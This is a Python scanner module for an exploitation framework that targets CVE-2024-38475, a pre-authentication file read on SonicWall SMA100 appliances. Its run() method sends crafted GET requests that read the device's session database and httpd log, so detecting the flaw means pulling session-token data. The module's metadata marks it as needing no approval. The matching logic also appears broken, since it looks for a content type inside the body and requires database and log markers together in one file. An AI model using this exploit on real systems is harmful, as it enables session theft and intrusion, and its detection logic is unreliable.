#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Improper escaping of output in mod_rewrite in Apache HTTP Server 2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Sonicwall - Pre-Authentication Arbitrary File Read Detection',
        'description': 'Improper escaping of output in mod_rewrite in Apache HTTP Server 2.4.59 and earlier allows an attacker to map URLs to filesystem locations that are permitted to be served by the server but are not intentionally/directly reachable by any URL, resulting in code execution or source code disclosure. Substitutions in server context that use a backreferences or variables as the first segment of the substitution are affected. Some unsafe RewiteRules will be broken by this change and the rewrite flag "UnsafePrefixStat" can be used to opt back in once ensuring the substitution is appropriately constrained.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'sonicwal', 'sma-100', 'lfi', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/watchtowrlabs/watchTowr-vs-SonicWall-PreAuth-RCE-Chain/blob/main/watchTowr-vs-SonicWall-PreAuth-RCE-Chain.py',
            'https://labs.watchtowr.com/sonicboom-from-stolen-tokens-to-remote-shells-sonicwall-sma100-cve-2023-44221-cve-2024-38475/',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-38475',
        ],
        'cve': 'CVE-2024-38475',
    }

    def run(self):
        for path in ('/tmp/temp.db%3f.1.1.1.1a-1.css', '/mnt/ram/var/log/httpd.log%3f.1.1.1.1a-1.css'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_any = ('text/plain',)
            body_all = ('SQLite format', 'sessionId', 'mod_antiloris', '[pid',)
            if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
                self.set_info(
                    severity='critical',
                    reason="Sonicwall - Pre-Authentication Arbitrary File Read detected",
                    path=path,
                )
                return True
        return False

